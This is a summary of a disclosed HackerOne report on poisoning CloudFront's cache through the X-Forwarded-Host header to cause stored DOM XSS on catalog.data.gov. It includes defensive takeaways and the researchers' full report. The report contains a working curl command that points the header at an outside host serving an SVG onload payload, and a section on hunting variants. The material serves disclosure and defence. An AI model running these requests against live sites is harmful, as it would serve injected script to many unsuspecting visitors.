# Web Cache Poisoning to Stored DOM XSS via X-Forwarded-Host Header Injection on catalog.data.gov

## Metadata
- **Source:** HackerOne
- **Report:** 303730 | https://hackerone.com/reports/303730
- **Submitted:** 2018-01-10
- **Reporter:** albinowax
- **Program:** Data.gov
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Web Cache Poisoning, DOM-based XSS, HTTP Header Injection, Insecure Deserialization of Untrusted Data
- **CVEs:** None
- **Category:** web-api

## Summary
The server trusts the X-Forwarded-Host HTTP header and uses it to populate data attributes on the body tag, which are then used by JavaScript to fetch JSON configuration files. An attacker can poison CloudFront's cache with a malicious X-Forwarded-Host value pointing to attacker-controlled infrastructure, causing stored XSS to execute in victims' browsers when they visit the poisoned page.

## Attack scenario
1. Attacker crafts a GET request to catalog.data.gov with a malicious X-Forwarded-Host header pointing to attacker-controlled domain (e.g., portswigger-labs.net/catalog.data.gov_json_xss/json.php)
2. CloudFront caches the response containing the poisoned data-site-root attribute with the attacker's domain
3. Legitimate users visit the same URL (catalog.data.gov) and receive the cached poisoned response from CloudFront
4. Client-side JavaScript reads the data-site-root attribute and fetches JSON from the attacker-controlled domain
5. Attacker-controlled JSON file contains malicious payload in the 'show_more' field (e.g., HTML with SVG onload handler)
6. JSON response is inserted into the page without escaping, causing DOM XSS to execute in victim browsers (e.g., alert(document.domain) popup)

## Root cause
Multiple security failures: (1) Server trusts X-Forwarded-Host header without validation, (2) Unsanitized reflection of header value into HTML data attributes, (3) Client-side JavaScript fetches external resources based on untrusted data attributes, (4) Unsafe insertion of external JSON data into DOM without escaping/sanitization, (5) Lack of cache invalidation strategy for poisoned responses

## Attacker mindset
An attacker recognizes that while they cannot force victims to send malicious headers, they can leverage the caching layer to amplify their attack. By poisoning CloudFront's cache once, their payload is automatically served to multiple users without further interaction. This transforms a low-impact header injection into a high-impact defacement attack affecting many visitors. The attacker opts for a proof-of-concept using alert() to demonstrate the vulnerability safely rather than deploying actual malware.

## Defensive takeaways
- Never trust X-Forwarded-Host or similar proxy headers without validation against a whitelist of known hosts
- Implement strict input validation and sanitization for any data that will be reflected in HTML attributes or used to construct URLs
- Always escape/encode data retrieved from external sources before inserting into DOM, regardless of source type
- Use Content Security Policy (CSP) to restrict resource loading and inline script execution
- Implement cache key normalization to prevent cache poisoning via header manipulation
- Consider using Subresource Integrity (SRI) for external JSON resources to detect tampering
- Sanitize JSON responses on the client-side before DOM insertion, particularly for user-facing text content
- Regularly audit CDN cache configuration and implement mechanisms to purge potentially poisoned content
- Use HTTPS-only and HSTS headers to prevent header injection via intermediaries

## Variant hunting
Look for similar patterns where: (1) Other HTTP headers (X-Forwarded-Proto, X-Original-Host, X-Host) are trusted without validation, (2) Other pages on catalog.data.gov or related government domains use similar i18n/localization patterns, (3) Other CDN-fronted applications trust proxy headers in data attributes, (4) Similar server-side reflection of headers in meta tags, script tags, or other injectable contexts, (5) Other endpoints that fetch and render JSON from URLs derived from untrusted input

## MITRE ATT&CK
- T1190
- T1598
- T1557
- T1200
- T1204

## Notes
This is a well-executed chained vulnerability requiring understanding of caching mechanisms, HTTP headers, DOM manipulation, and XSS. The researchers demonstrated exceptional responsibility by including safe replication instructions with a query parameter to limit cache poisoning scope. The vulnerability affects data.gov, a high-profile government website, making this particularly impactful. The attack is particularly insidious because it combines three issues that might individually seem minor but together create a critical vulnerability.

## Full report
<details><summary>Expand</summary>

An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.

The root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the <body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.

This behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users. 

Please be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:

1. Run curl command to poison cache:
curl -i -s -k  -X $'GET' \
    -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \
    $'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null

2. Visit the poisoned page:
https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6

3. Wait for a few seconds, and observe the popup caused by our injected alert(document.domain)

Behind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into "Mostrar más <svg onload=alert(document.domain)>"

This is the offending line of JavaScript:
var template_more = ['<tr class="toggle-show toggle-show-more">', '<td colspan="' + cols + '">', '<small>', '<a href="#" class="show-more">' + this.i18n('show_more') + '</a>', '<a href="#" class="show-less">' + this.i18n('show_less') + '</a>', '</small>', '</td>', '</tr>'].join('\n');

To mitigate this issue, I recommend addressing the X-Forwarded-Host reflection. 

Please let me know if you have any questions.

Cheers,

James & Gareth

## Impact

An attacker can deface most pages on catalog.data.gov.

</details>

---
*Analysed by Claude on 2026-05-12*
